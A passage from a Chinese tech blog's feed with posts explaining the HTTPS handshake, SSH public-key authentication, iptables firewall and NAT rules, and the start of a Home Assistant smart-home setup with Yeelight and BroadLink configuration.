<h2 id="Https"><a href="#Https" class="headerlink" title="Https"></a>Https</h2><p>Hyper Text Transfer Protocol over Secure Socket Layer，安全的超文本传输协议，网景公式设计了SSL(Secure Sockets Layer)协议用于对Http协议传输的数据进行加密，保证会话过程中的安全性。</p>
<p>使用TCP端口默认为443</p>
<h2 id="SSL协议加密方式"><a href="#SSL协议加密方式" class="headerlink" title="SSL协议加密方式"></a>SSL协议加密方式</h2><p>SSL协议即用到了对称加密也用到了非对称加密(公钥加密)，在建立传输链路时，SSL首先对对称加密的密钥使用公钥进行非对称加密，链路建立好之后，SSL对传输内容使用对称加密。</p>
<p>对称加密<br>速度高，可加密内容较大，用来加密会话过程中的消息</p>
<p>公钥加密<br>加密速度较慢，但能提供更好的身份认证技术，用来加密对称加密的密钥</p>
<h2 id="单向认证"><a href="#单向认证" class="headerlink" title="单向认证"></a>单向认证</h2><p>Https在建立Socket连接之前，需要进行握手，具体过程如下：<br><img src="/articles/e4025678/1.png" alt></p>
<ol>
<li>客户端向服务端发送SSL协议版本号、加密算法种类、随机数等信息。</li>
<li>服务端给客户端返回SSL协议版本号、加密算法种类、随机数等信息，同时也返回服务器端的证书，即公钥证书</li>
<li>客户端使用服务端返回的信息验证服务器的合法性，包括：<ul>
<li>证书是否过期</li>
<li>发型服务器证书的CA是否可靠</li>
<li>返回的公钥是否能正确解开返回证书中的数字签名</li>
<li>服务器证书上的域名是否和服务器的实际域名相匹配<br>验证通过后，将继续进行通信，否则，终止通信</li>
</ul>
</li>
<li>客户端向服务端发送自己所能支持的对称加密方案，供服务器端进行选择</li>
<li>服务器端在客户端提供的加密方案中选择加密程度最高的加密方式。</li>
<li>服务器将选择好的加密方案通过明文方式返回给客户端</li>
<li>客户端接收到服务端返回的加密方式后，使用该加密方式生成产生随机码，用作通信过程中对称加密的密钥，使用服务端返回的公钥进行加密，将加密后的随机码发送至服务器</li>
<li>服务器收到客户端返回的加密信息后，使用自己的私钥进行解密，获取对称加密密钥。<br>在接下来的会话中，服务器和客户端将会使用该密码进行对称加密，保证通信过程中信息的安全。</li>
</ol>
<h2 id="双向认证"><a href="#双向认证" class="headerlink" title="双向认证"></a>双向认证</h2><p>双向认证和单向认证原理基本差不多，只是除了客户端需要认证服务端以外，增加了服务端对客户端的认证，具体过程如下：<br><img src="/articles/e4025678/2.png" alt></p>
<ol>
<li>客户端向服务端发送SSL协议版本号、加密算法种类、随机数等信息。</li>
<li>服务端给客户端返回SSL协议版本号、加密算法种类、随机数等信息，同时也返回服务器端的证书，即公钥证书</li>
<li>客户端使用服务端返回的信息验证服务器的合法性，包括：<ul>
<li>证书是否过期</li>
<li>发型服务器证书的CA是否可靠</li>
<li>返回的公钥是否能正确解开返回证书中的数字签名</li>
<li>服务器证书上的域名是否和服务器的实际域名相匹配<br>验证通过后，将继续进行通信，否则，终止通信</li>
</ul>
</li>
<li>服务端要求客户端发送客户端的证书，客户端会将自己的证书发送至服务端</li>
<li>验证客户端的证书，通过验证后，会获得客户端的公钥</li>
<li>客户端向服务端发送自己所能支持的对称加密方案，供服务器端进行选择</li>
<li>服务器端在客户端提供的加密方案中选择加密程度最高的加密方式</li>
<li>将加密方案通过使用之前获取到的公钥进行加密，返回给客户端</li>
<li>客户端收到服务端返回的加密方案密文后，使用自己的私钥进行解密，获取具体加密方式，而后，产生该加密方式的随机码，用作加密过程中的密钥，使用之前从服务端证书中获取到的公钥进行加密后，发送给服务端</li>
<li>服务端收到客户端发送的消息后，使用自己的私钥进行解密，获取对称加密的密钥，在接下来的会话中，服务器和客户端将会使用该密码进行对称加密，保证通信过程中信息的安全。</li>
</ol>
]]></content>
      <categories>
        <category>网络技术</category>
      </categories>
      <tags>
        <tag>Http</tag>
      </tags>
  </entry>
  <entry>
    <title>ssh认证原理</title>
    <url>/articles/e7844ae3.html</url>
    <content><![CDATA[<h2 id="目的"><a href="#目的" class="headerlink" title="目的"></a>目的</h2><p>通常，通过ssh登录远程服务器时，使用<strong>密码认证</strong>，分别输入用户名和密码，两者满足一定规则就可以登录。但是密码认证有以下的缺点：</p>
<ul>
<li>用户无法设置空密码（即使系统允许空密码，也会十分危险）</li>
<li>密码容易被人偷窥或猜到</li>
<li>服务器上的一个帐户若要给多人使用，则必须让所有使用者都知道密码，导致密码容易泄露，而且修改密码时必须通知所有人</li>
</ul>
<p>而使用<strong>公钥认证</strong>则可以解决上述问题。</p>
<ul>
<li><p>公钥认证允许使用空密码，省去每次登录都需要输入密码的麻烦</p>
</li>
<li><p>多个使用者可以通过各自的密钥登录到系统上的同一个用户</p>
</li>
</ul>
<a id="more"></a>

<h2 id="认证原理"><a href="#认证原理" class="headerlink" title="认证原理"></a>认证原理</h2><p>所谓的<strong>公钥认证</strong>，实际上是使用一对加密字符串，一个称为<strong>公钥</strong>(public key)，任何人都可以看到其内容，用于加密；另一个称为<strong>密钥</strong>(private key)，只有拥有者才能看到，用于解密。通过公钥加密过的密文使用密钥可以轻松解密，但根据公钥来猜测密钥却十分困难。</p>
<p>ssh 的公钥认证就是使用了这一特性。服务器和客户端都各自拥有自己的公钥和密钥。为了说明方便，以下将使用这些符号。</p>
<table>
<thead>
<tr>
<th>Ac</th>
<th></th>
<th>客户端公钥</th>
</tr>
</thead>
<tbody><tr>
<td>Bc</td>
<td></td>
<td>客户端密钥</td>
</tr>
<tr>
<td>As</td>
<td></td>
<td>服务器公钥</td>
</tr>
<tr>
<td>Bs</td>
<td></td>
<td>服务器密钥</td>
</tr>
</tbody></table>
<p>在认证之前，客户端需要通过某种方法将公钥 Ac 登录到服务器上。</p>
<p>认证过程分为两个步骤。</p>
<p>1、会话密钥(session key)生成<br>     1）客户端请求连接服务器，服务器将 As 发送给客户端。<br>     2）服务器生成<strong>会话ID</strong>(session id)，设为 p，发送给客户端。<br>     3）客户端生成<strong>会话密钥</strong>(session key)，设为 q，并计算 r = p xor q。<br>     4）客户端将 r 用 As 进行加密，结果发送给服务器。<br>     5）服务器用 Bs 进行解密，获得 r。<br>     6）服务器进行 r xor p 的运算，获得 q。<br>     7）至此服务器和客户端都知道了<strong>会话密钥</strong>q，以后的传输都将被 q 加密。</p>
<p>2、认证<br>     1）服务器生成随机数 x，并用 Ac 加密后生成结果 S(x)，发送给客户端<br>     2）客户端使用 Bc 解密 S(x) 得到 x<br>     3）客户端计算 q + x 的 md5 值 n(q+x)，q为上一步得到的会话密钥<br>     4）服务器计算 q + x 的 md5 值 m(q+x)<br>     5）客户端将 n(q+x) 发送给服务器<br>     6）服务器比较 m(q+x) 和 n(q+x)，两者相同则认证成功</p>
]]></content>
      <categories>
        <category>网络技术</category>
      </categories>
      <tags>
        <tag>Network</tag>
      </tags>
  </entry>
  <entry>
    <title>iptables使用详解</title>
    <url>/articles/68ead32e.html</url>
    <content><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>防 火墙，其实说白了讲，就是用于实现Linux下访问控制的功能的，它分为硬件的或者软件的防火墙两种。无论是在哪个网络中，防火墙工作的地方一定是在网络 的边缘。而我们的任务就是需要去定义到底防火墙如何工作，这就是防火墙的策略规则。制定策略规则以达到让它对出入网络的IP、数据进行检测。</p>
<p>目前市面上比较常见的有3、4层的防火墙，叫网络层的防火墙，还有7层的防火墙，其实是代理层的网关。</p>
<p>对于TCP/IP的七层模型来讲，我们知道第三层是网络层，三层的防火墙会在这层对源地址和目标地址进行检测。但是对于七层的防火墙，不管你源端口或者目标端口，源地址或者目标地址是什么，都将对你所有的东西进行检查。 所以，对于设计原理来讲，七层防火墙更加安全，但是这却带来了效率更低。所以市面上通常的防火墙方案，都是两者结合的。而又由于我们都需要从防火墙所控制 的这个口来访问，所以防火墙的工作效率就成了用户能够访问数据多少的一个最重要的控制，配置的不好甚至有可能成为流量的瓶颈。</p>
 <a id="more"></a>

<h2 id="历史"><a href="#历史" class="headerlink" title="历史"></a><strong>历史</strong></h2><p>iptables 的前身叫ipfirewall （内核1.x时代）,这是一个作者从freeBSD上移植过来的，能够工作在内核当中的，对数据包进行检测的一款简易访问控制工具。但是 ipfirewall工作功能极其有限(它需要将所有的规则都放进内核当中，这样规则才能够运行起来，而放进内核，这个做法一般是极其困难的)。当内核发 展到2.x系列的时候，软件更名为ipchains，它可以定义多条规则，将他们串起来，共同发挥作用，而现在，它叫做iptables，可以将规则组成一个列表，实现绝对详细的访问控制功能。</p>
<p>他们都是工作在用户空间中，定义规则的工具，本身并不算是防火墙。它们定义的规则，可以让在内核空间当中的netfilter来读取，并且实现让防火墙工作。而放入内核的地方必须要是特定的位置，必须是tcp/ip的协议栈经过的地方。而这个tcp/ip协议栈必须经过的地方，可以实现读取规则的地方就叫做 netfilter.(网络过滤器)</p>
<p>一共在内核空间中选择了5个位置，</p>
<p>​    1.内核空间中：从一个网络接口进来，到另一个网络接口去的</p>
<p>​    2.数据包从内核流入用户空间的</p>
<p>​    3.数据包从用户空间流出的</p>
<p>​    4.进入/离开本机的外网接口</p>
<p>​    5.进入/离开本机的内网接口</p>
<p>​        </p>
<h2 id="工作机制"><a href="#工作机制" class="headerlink" title="工作机制"></a><strong>工作机制</strong></h2><p>从 上面的发展我们知道了作者选择了5个位置，来作为控制的地方，但是你有没有发现，其实前三个位置已经基本上能将路径彻底封锁了，但是为什么已经在进出的口 设置了关卡之后还要在内部卡呢？ 由于数据包尚未进行路由决策，还不知道数据要走向哪里，所以在进出口是没办法实现数据过滤的。所以要在内核空间里设置转发的关卡，进入用户空间的关卡，从 用户空间出去的关卡。那么，既然他们没什么用，那我们为什么还要放置他们呢？因为我们在做NAT和DNAT的时候，目标地址转换必须在路由之前转换。所以我们必须在外网而后内网的接口处进行设置关卡。        </p>
<p>这五个位置也被称为五个钩子函数（hook functions）,也叫五个规则链。</p>
<p>​        1.PREROUTING (路由前)</p>
<p>​        2.INPUT (数据包流入口)</p>
<p>​        3.FORWARD (转发管卡)</p>
<p>​        4.OUTPUT(数据包出口)</p>
<p>​        5.POSTROUTING（路由后）</p>
<p>​        这是NetFilter规定的五个规则链，任何一个数据包，只要经过本机，必将经过这五个链中的其中一个链。       </p>
<h2 id="防火墙的策略"><a href="#防火墙的策略" class="headerlink" title="防火墙的策略"></a><strong>防火墙的策略</strong></h2><p>防火墙策略一般分为两种，一种叫“通”策略，一种叫“堵”策略，通策略，默认门是关着的，必须要定义谁能进。堵策略则是，大门是洞开的，但是你必须有身份认证，否则不能进。所以我们要定义，让进来的进来，让出去的出去，所以通，是要全通，而堵，则是要选择。当我们定义的策略的时候，要分别定义多条功能，其中：定义数据包中允许或者不允许的策略，filter过滤的功能，而定义地址转换的功能的则是nat选项。为了让这些功能交替工作，我们制定出了“表”这个定义，来定义、区分各种不同的工作功能和处理方式。</p>
<p>我们现在用的比较多个功能有3个：</p>
<p>1.filter 定义允许或者不允许的</p>
<p>2.nat 定义地址转换的 </p>
<p>3.mangle功能:修改报文原数据</p>
<p>我们修改报文原数据就是来修改TTL的。能够实现将数据包的元数据拆开，在里面做标记/修改内容的。而防火墙标记，其实就是靠mangle来实现的。</p>
<p> 扩展:</p>
<p>​    对于filter来讲一般只能做在3个链上：INPUT ，FORWARD ，OUTPUT</p>
<p>​    对于nat来讲一般也只能做在3个链上：PREROUTING ，OUTPUT ，POSTROUTING</p>
<p>​    而mangle则是5个链都可以做：PREROUTING，INPUT，FORWARD，OUTPUT，POSTROUTING</p>
<p>iptables/netfilter（这款软件）是工作在用户空间的，它可以让规则进行生效的，本身不是一种服务，而且规则是立即生效的。而我们iptables现在被做成了一个服务，可以进行启动，停止的。启动，则将规则直接生效，停止，则将规则撤销。 </p>
<p>iptables还支持自己定义链。但是自己定义的链，必须是跟某种特定的链关联起来的。在一个关卡设定，指定当有数据的时候专门去找某个特定的链来处理，当那个链处理完之后，再返回。接着在特定的链中继续检查。</p>
<p>注意：规则的次序非常关键，谁的规则越严格，应该放的越靠前，而检查规则的时候，是按照从上往下的方式进行检查的。</p>
<h2 id="规则的写法"><a href="#规则的写法" class="headerlink" title="规则的写法"></a><strong>规则的写法</strong></h2><p>​     iptables定义规则的方式比较复杂:</p>
<p>​     格式：iptables [-t table] COMMAND chain CRETIRIA -j ACTION</p>
<p>​         -t table ：3个filter nat mangle</p>
<p>​         COMMAND：定义如何对规则进行管理</p>
<p>​         chain：指定你接下来的规则到底是在哪个链上操作的，当定义策略的时候，是可以省略的</p>
<p>​         CRETIRIA:指定匹配标准</p>
<p>​         -j ACTION :指定如何进行处理</p>
<p>​     比如：不允许172.16.0.0/24的进行访问。</p>
<p>​     iptables -t filter -A INPUT -s 172.16.0.0/16 -p udp –dport 53 -j DROP</p>
<p>​     当然你如果想拒绝的更彻底：</p>
<p>​     iptables -t filter -R INPUT 1 -s 172.16.0.0/16 -p udp –dport 53 -j REJECT</p>
<p>​     iptables -L -n -v    #查看定义规则的详细信息</p>
<h2 id="详解命令"><a href="#详解命令" class="headerlink" title="详解命令"></a><strong>详解命令</strong></h2><h4 id="链管理命令（这都是立即生效的）"><a href="#链管理命令（这都是立即生效的）" class="headerlink" title="链管理命令（这都是立即生效的）"></a><strong>链管理命令（这都是立即生效的）</strong></h4><p>​    -P :设置默认策略的（设定默认门是关着的还是开着的）</p>
<p>​        默认策略一般只有两种</p>
<p>​        iptables -P INPUT (DROP|ACCEPT)  默认是关的/默认是开的</p>
<p>​        比如：</p>
<p>​        iptables -P INPUT DROP 这就把默认规则给拒绝了。并且没有定义哪个动作，所以关于外界连接的所有规则包括Xshell连接之类的，远程连接都被拒绝了。</p>
<p>​        -F: FLASH，清空规则链的(注意每个链的管理权限)</p>
<p>​        iptables -t nat -F PREROUTING</p>
<p>​        iptables -t nat -F 清空nat表的所有链</p>
<p>​        -N:NEW 支持用户新建一个链</p>
<p>​            iptables -N inbound_tcp_web 表示附在tcp表上用于检查web的。</p>
<p>​        -X: 用于删除用户自定义的空链</p>
<p>​            使用方法跟-N相同，但是在删除之前必须要将里面的链给清空昂了</p>
<p>​        -E：用来Rename chain主要是用来给用户自定义的链重命名</p>
<p>​            -E oldname newname</p>
<p>​         -Z：清空链，及链中默认规则的计数器的（有两个计数器，被匹配到多少个数据包，多少个字节）</p>
<p>​            iptables -Z :清空</p>
<h4 id="规则管理命令"><a href="#规则管理命令" class="headerlink" title="规则管理命令"></a><strong>规则管理命令</strong></h4><p>​         -A：追加，在当前链的最后新增一个规则</p>
<p>​         -I num : 插入，把当前规则插入为第几条。</p>
<p>​            -I 3 :插入为第三条</p>
<p>​         -R num：Replays替换/修改第几条规则</p>
<p>​            格式：iptables -R 3 …………</p>
<p>​         -D num：删除，明确指定删除第几条规则</p>
<p>​        </p>
<h4 id="查看管理命令-“-L”"><a href="#查看管理命令-“-L”" class="headerlink" title="查看管理命令 “-L”"></a><strong>查看管理命令 “-L”</strong></h4><p>​     附加子命令</p>
<p>​     -n：以数字的方式显示ip，它会将ip直接显示出来，如果不加-n，则会将ip反向解析成主机名。</p>
<p>​     -v：显示详细信息</p>
<p>​     -vv</p>
<p>​     -vvv :越多越详细</p>
<p>​     -x：在计数器上显示精确值，不做单位换算</p>
<p>​     –line-numbers : 显示规则的行号</p>
<p>​     -t nat：显示所有的关卡的信息</p>
<h4 id="详解匹配标准"><a href="#详解匹配标准" class="headerlink" title="详解匹配标准"></a><strong>详解匹配标准</strong></h4><p><strong>1.通用匹配：源地址目标地址的匹配</strong></p>
<p>​     -s：指定作为源地址匹配，这里不能指定主机名称，必须是IP</p>
<p>​        IP | IP/MASK | 0.0.0.0/0.0.0.0</p>
<p>​        而且地址可以取反，加一个“!”表示除了哪个IP之外</p>
<p>​     -d：表示匹配目标地址</p>
<p>​     -p：用于匹配协议的（这里的协议通常有3种，TCP/UDP/ICMP）</p>
<p>​     -i eth0：从这块网卡流入的数据</p>
<p>​        流入一般用在INPUT和PREROUTING上</p>
<p>​     -o eth0：从这块网卡流出的数据</p>
<p>​        流出一般在OUTPUT和POSTROUTING上</p>
<p><strong>2.扩展匹配</strong></p>
<p>2.1隐含扩展：对协议的扩展</p>
<p>​    -p tcp :TCP协议的扩展。一般有三种扩展</p>
<p>​    –dport XX-XX：指定目标端口,不能指定多个非连续端口,只能指定单个端口，比如</p>
<p>​    –dport 21  或者 –dport 21-23 (此时表示21,22,23)</p>
<p>​    –sport：指定源端口</p>
<p>​    –tcp-fiags：TCP的标志位（SYN,ACK，FIN,PSH，RST,URG）</p>
<p>​        对于它，一般要跟两个参数：</p>
<p>​        1.检查的标志位</p>
<p>​        2.必须为1的标志位</p>
<p>​        –tcpflags syn,ack,fin,rst syn   =    –syn</p>
<p>​        表示检查这4个位，这4个位中syn必须为1，其他的必须为0。所以这个意思就是用于检测三次握手的第一次包的。对于这种专门匹配第一包的SYN为1的包，还有一种简写方式，叫做–syn</p>
<p>​    -p udp：UDP协议的扩展</p>
<p>​        –dport</p>
<p>​        –sport</p>
<p>​    -p icmp：icmp数据报文的扩展</p>
<p>​        –icmp-type：</p>
<p>​        echo-request(请求回显)，一般用8 来表示</p>
<p>​        所以 –icmp-type 8 匹配请求回显数据包</p>
<p>​        echo-reply （响应的数据包）一般用0来表示</p>
<p>​                  </p>
<p>2.2显式扩展（-m）</p>
<p>​     扩展各种模块</p>
<p>​      -m multiport：表示启用多端口扩展</p>
<p>​      之后我们就可以启用比如 –dports 21,23,80</p>
<p>​                  </p>
<p>​        </p>
<h4 id="详解-j-ACTION"><a href="#详解-j-ACTION" class="headerlink" title="详解-j ACTION"></a><strong>详解-j ACTION</strong></h4><p>​     常用的ACTION：</p>
<p>​     DROP：悄悄丢弃</p>
<p>​        一般我们多用DROP来隐藏我们的身份，以及隐藏我们的链表</p>
<p>​     REJECT：明示拒绝</p>
<p>​     ACCEPT：接受</p>
<p>​        custom_chain：转向一个自定义的链</p>
<p>​     DNAT</p>
<p>​     SNAT</p>
<p>​     MASQUERADE：源地址伪装</p>
<p>​     REDIRECT：重定向：主要用于实现端口重定向</p>
<p>​     MARK：打防火墙标记的</p>
<p>​     RETURN：返回</p>
<p>​        在自定义链执行完毕后使用返回，来返回原规则链。</p>
<p><strong>练习题：</strong></p>
<p>​     只要是来自于172.16.0.0/16网段的都允许访问我本机的172.16.100.1的SSHD服务</p>
<p>​     分析：首先肯定是在允许表中定义的。因为不需要做NAT地址转换之类的，然后查看我们SSHD服务，在22号端口上，处理机制是接受，对于这个表，需要 有一来一回两个规则，如果我们允许也好，拒绝也好，对于访问本机服务，我们最好是定义在INPUT链上，而OUTPUT再予以定义就好。(会话的初始端先 定义)，所以加规则就是：</p>
<p>​     定义进来的： iptables -t filter -A INPUT -s 172.16.0.0/16 -d 172.16.100.1 -p tcp –dport 22 -j ACCEPT</p>
<p>​     定义出去的： iptables -t filter -A OUTPUT -s 172.16.100.1 -d 172.16.0.0/16 -p tcp –dport 22 -j ACCEPT</p>
<p>​     将默认策略改成DROP:</p>
<p>​                  iptables -P INPUT DROP</p>
<p>​                  iptables -P OUTPUT DROP</p>
<p>​                  iptables -P FORWARD DROP</p>
<p>​        </p>
<h4 id="状态检测："><a href="#状态检测：" class="headerlink" title="状态检测："></a><strong>状态检测：</strong></h4><p>是一种显式扩展，用于检测会话之间的连接关系的，有了检测我们可以实现会话间功能的扩展</p>
<p>什么是状态检测？对于整个TCP协议来讲，它是一个有连接的协议，三次握手中，第一次握手，我们就叫NEW连接，而从第二次握手以后的，ack都为1，这 是正常的数据传输，和tcp的第二次第三次握手，叫做已建立的连接（ESTABLISHED）,还有一种状态，比较诡异的，比如：SYN=1 ACK=1 RST=1,对于这种我们无法识别的，我们都称之为INVALID无法识别的。还有第四种，FTP这种古老的拥有的特征，每个端口都是独立的，21号和 20号端口都是一去一回，他们之间是有关系的，这种关系我们称之为RELATED。</p>
<p>所以我们的状态一共有四种：</p>
<p>​        NEW</p>
<p>​        ESTABLISHED</p>
<p>​        RELATED</p>
<p>​        INVALID</p>
<p> 所以我们对于刚才的练习题，可以增加状态检测。比如进来的只允许状态为NEW和ESTABLISHED的进来，出去只允许ESTABLISHED的状态出去，这就可以将比较常见的反弹式木马有很好的控制机制。</p>
<p>对于练习题的扩展：</p>
<p>进来的拒绝出去的允许，进来的只允许ESTABLISHED进来，出去只允许ESTABLISHED出去。默认规则都使用拒绝</p>
<p>​        iptables -L -n –line-number  ：查看之前的规则位于第几行</p>
<p>​    改写INPUT</p>
<p>​        iptables -R INPUT 2 -s 172.16.0.0/16 -d 172.16.100.1 -p tcp –dport 22 -m state –state NEW,ESTABLISHED -j ACCEPT</p>
<p>​        iptables -R OUTPUT 1 -m state –state ESTABLISHED -j ACCEPT</p>
<p>​    此时如果想再放行一个80端口如何放行呢？</p>
<p>​        iptables -A INPUT -d 172.16.100.1 -p tcp –dport 80 -m state –state NEW,ESTABLISHED -j ACCEPT</p>
<p>​        iptables -R INPUT 1 -d 172.16.100.1 -p udp –dport 53 -j ACCEPT</p>
<p><strong>练习题：</strong></p>
<p>假如我们允许自己ping别人，但是别人ping自己ping不通如何实现呢？</p>
<p>分析：对于ping这个协议，进来的为8（ping），出去的为0(响应).我们为了达到目的，需要8出去,允许0进来</p>
<p>在出去的端口上：iptables -A OUTPUT -p icmp –icmp-type 8 -j ACCEPT</p>
<p>在进来的端口上：iptables -A INPUT -p icmp –icmp-type 0 -j ACCEPT</p>
<p>小扩展：对于127.0.0.1比较特殊，我们需要明确定义它</p>
<p>​            iptables -A INPUT -s 127.0.0.1 -d 127.0.0.1 -j ACCEPT</p>
<p>​            iptables -A OUTPUT -s 127.0.0.1 -d 127.0.0.1 -j ACCEPT</p>
<h4 id="SNAT和DNAT的实现"><a href="#SNAT和DNAT的实现" class="headerlink" title="SNAT和DNAT的实现"></a><strong>SNAT和DNAT的实现</strong></h4><p>由于我们现在IP地址十分紧俏，已经分配完了，这就导致我们必须要进行地址转换，来节约我们仅剩的一点IP资源。那么通过iptables如何实现NAT的地址转换呢？</p>
<p><strong>1.SNAT基于原地址的转换</strong></p>
<p>基于原地址的转换一般用在我们的许多内网用户通过一个外网的口上网的时候，这时我们将我们内网的地址转换为一个外网的IP，我们就可以实现连接其他外网IP的功能。</p>
<p>所以我们在iptables中就要定义到底如何转换：</p>
<p>定义的样式：</p>
<p>​    比如我们现在要将所有192.168.10.0网段的IP在经过的时候全都转换成172.16.100.1这个假设出来的外网地址：</p>
<p>​    iptables -t nat -A POSTROUTING -s 192.168.10.0/24 -j SNAT –to-source 172.16.100.1</p>
<p>​    这样，只要是来自本地网络的试图通过网卡访问网络的，都会被统统转换成172.16.100.1这个IP.</p>
<p>​    那么，如果172.16.100.1不是固定的怎么办？</p>
<p>​    我 们都知道当我们使用联通或者电信上网的时候，一般它都会在每次你开机的时候随机生成一个外网的IP，意思就是外网地址是动态变换的。这时我们就要将外网地 址换成 MASQUERADE(动态伪装):它可以实现自动寻找到外网地址，而自动将其改为正确的外网地址。所以，我们就需要这样设置：</p>
<p>​         iptables -t nat -A POSTROUTING -s 192.168.10.0/24 -j MASQUERADE</p>
<p>​         这里要注意：地址伪装并不适用于所有的地方。</p>
<p><strong>2.DNAT目标地址转换</strong></p>
<p>​    对于目标地址转换，数据流向是从外向内的，外面的是客户端，里面的是服务器端通过目标地址转换，我们可以让外面的ip通过我们对外的外网ip来访问我们服务器不同的服务器，而我们的服务却放在内网服务器的不同的服务器上。</p>
<p>​    如何做目标地址转换呢？：</p>
<p>​        iptables -t nat -A PREROUTING -d 192.168.10.18 -p tcp –dport 80 -j DNAT –todestination 172.16.100.2</p>
<p>​        目标地址转换要做在到达网卡之前进行转换,所以要做在PREROUTING这个位置上</p>
<h4 id="控制规则的存放以及开启"><a href="#控制规则的存放以及开启" class="headerlink" title="控制规则的存放以及开启"></a>控制规则的存放以及开启</h4><p>​    注意：你所定义的所有内容，当你重启的时候都会失效，要想我们能够生效，需要使用一个命令将它保存起来</p>
<p>​    1.service iptables save 命令</p>
<p>​        它会保存在/etc/sysconfig/iptables这个文件中</p>
<p>​    2.iptables-save 命令</p>
<p>​        iptables-save &gt; /etc/sysconfig/iptables</p>
<p>​    3.iptables-restore 命令</p>
<p>​            开机的时候，它会自动加载/etc/sysconfig/iptabels</p>
<p>​            如果开机不能加载或者没有加载，而你想让一个自己写的配置文件（假设为iptables.2）手动生效的话：</p>
<p>​            iptables-restore &lt; /etc/sysconfig/iptables.2</p>
<p>​            则完成了将iptables中定义的规则手动生效</p>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a><strong>总结</strong></h2><p>​         Iptables是一个非常重要的工具，它是每一个防火墙上几乎必备的设置，也是我们在做大型网络的时候，为了很多原因而必须要设置的。学好 Iptables,可以让我们对整个网络的结构有一个比较深刻的了解，同时，我们还能够将内核空间中数据的走向以及linux的安全给掌握的非常透彻。我 们在学习的时候，尽量能结合着各种各样的项目，实验来完成，这样对你加深iptables的配置，以及各种技巧有非常大的帮助。</p>
<p>附加iptables比较好的文章：</p>
<p><a href="http://www.linuxso.com/linuxpeixun/10332.html" target="_blank" rel="noopener">netfilter/iptables全攻略</a></p>
]]></content>
      <categories>
        <category>网络技术</category>
      </categories>
      <tags>
        <tag>Iptables</tag>
      </tags>
  </entry>
  <entry>
    <title>智能家居实践(三):接入硬件</title>
    <url>/articles/acf227f8.html</url>
    <content><![CDATA[<h2 id="目的"><a href="#目的" class="headerlink" title="目的"></a>目的</h2><p>终于到了这一临门一脚了。前面了解了这么多基础知识，这一篇，我们终于可以完成这最后一步了 ———— 接入硬件。</p>
<a id="more"></a>

<h2 id="接入"><a href="#接入" class="headerlink" title="接入"></a>接入</h2><p><strong>理论上市面上所有能接入 Wifi 用手机控制的电器都能用 HomeAssistant 控制。</strong></p>
<p>比如我的硬件列表有：<a href="http://www.mi.com/yeelight/" target="_blank" rel="noopener">Yeelight</a>, <a href="http://www.mi.com/yeelight/" target="_blank" rel="noopener">小米多功能网关</a>, <a href="http://item.mi.com/1164900030.html?cfrom=search" target="_blank" rel="noopener">米家智能插座</a>, <a href="https://world.taobao.com/item/527345142232.htm?spm=a312a.7700825.1997196601.47.m4JsUn" target="_blank" rel="noopener">sonoff开关</a>，还有 <a href="https://world.taobao.com/item/40328222213.htm?spm=a312a.7700825.1997196601.58.m4JsUn" target="_blank" rel="noopener">ESP8266</a> 模拟 <a href="http://www.belkin.com/us/p/P-F7C027/" target="_blank" rel="noopener">Wemo Switch</a>，最后还有一个神器 <a href="https://world.tmall.com/item/40206907136.htm?spm=a312a.7700714.0.0.AKe8xQ" target="_blank" rel="noopener">BroadLink</a>。</p>
<h4 id="Yeelight-接入。"><a href="#Yeelight-接入。" class="headerlink" title="Yeelight 接入。"></a><strong>Yeelight</strong> 接入。</h4><p>文档在<a href="https://home-assistant.io/components/light.yeelight/" target="_blank" rel="noopener">这里</a>，配置很简单</p>
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">light:</span>  </span><br><span class="line"><span class="attr">  - platform:</span> <span class="string">yeelight</span></span><br><span class="line"><span class="attr">    devices:</span></span><br><span class="line">      <span class="number">192.168</span><span class="number">.1</span><span class="number">.25</span><span class="string">:</span></span><br><span class="line"><span class="attr">        name:</span> <span class="string">Living</span> <span class="string">Room</span></span><br><span class="line"><span class="attr">        transition:</span> <span class="number">1000</span></span><br><span class="line"><span class="attr">        use_music_mode:</span> <span class="literal">True</span> <span class="string">(defaults</span> <span class="string">to</span> <span class="literal">False</span><span class="string">)</span></span><br><span class="line"><span class="attr">        save_on_change:</span> <span class="literal">False</span> <span class="string">(defaults</span> <span class="string">to</span> <span class="literal">True</span><span class="string">)</span></span><br><span class="line">      <span class="number">192.168</span><span class="number">.1</span><span class="number">.13</span><span class="string">:</span></span><br><span class="line"><span class="attr">        name:</span> <span class="string">Front</span> <span class="string">Door</span></span><br></pre></td></tr></table></figure>

<p><code>light</code> 系统关键字，指定这是一个控制灯的服务。然后指定你的灯是什么品牌，在 <code>platform</code> 处声明，注意 <code>platform</code> 前面的横杠 <code>-</code>，这在 YAML 语法里面表示数，也就是说你有其他品牌的灯就在下方写 <code>- platform: other_brand_light</code> 就可以了。回到 yeelight 的配置，<code>devices</code> 下面填上灯的 IP 地址，可以登录路由器管理页面查到，如果你有多个 yeelight，就写多个 IP，然后用 <code>name</code> 区分。配置好之后，重启 HA。你就能在管理页面看到 Light 这个板块了。</p>
<p><img src="/articles/acf227f8/1.png" alt="img"></p>
<p>点击你灯的名字处，就会弹出操作板，然后你就可以随意控制了。</p>
<p><img src="/articles/acf227f8/2.png" alt="img"></p>
<p>其他的 Wifi 设备也都是一个套路。</p>
<h4 id="BroadLink-的使用"><a href="#BroadLink-的使用" class="headerlink" title="BroadLink 的使用"></a><strong>BroadLink</strong> 的使用</h4><p><img src="/articles/acf227f8/3.png" alt="img"></p>
<p>BroadLink 本质上是一个红外/频射发射器，他本来是通过学习红外码和频射信号，然后把手机作为一个超级遥控器控制其他电器使用的。但 HomeAssistant 已经集成了 BroadLink ，这让语音控制那些只能用红外/频射遥控的家电成为了可能。最常见的就是空调了。</p>
<p>相关文档在<a href="https://home-assistant.io/components/switch.broadlink/" target="_blank" rel="noopener">这里</a></p>
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">switch:</span>  </span><br><span class="line"><span class="attr">    platform:</span> <span class="string">broadlink</span></span><br><span class="line"><span class="attr">    host:</span> <span class="number">192.168</span><span class="number">.10</span><span class="number">.250</span></span><br><span class="line"><span class="attr">    mac:</span> <span class="string">'34:ea:34:e3:95:da'</span></span><br><span class="line"><span class="attr">    friendly_name:</span> <span class="string">"Kitten‘s Broadlink"</span></span><br><span class="line"><span class="attr">    switches:</span></span><br><span class="line"><span class="attr">      iqair:</span></span><br><span class="line"><span class="attr">        friendly_name:</span> <span class="string">"iqair--"</span></span><br><span class="line"><span class="attr">        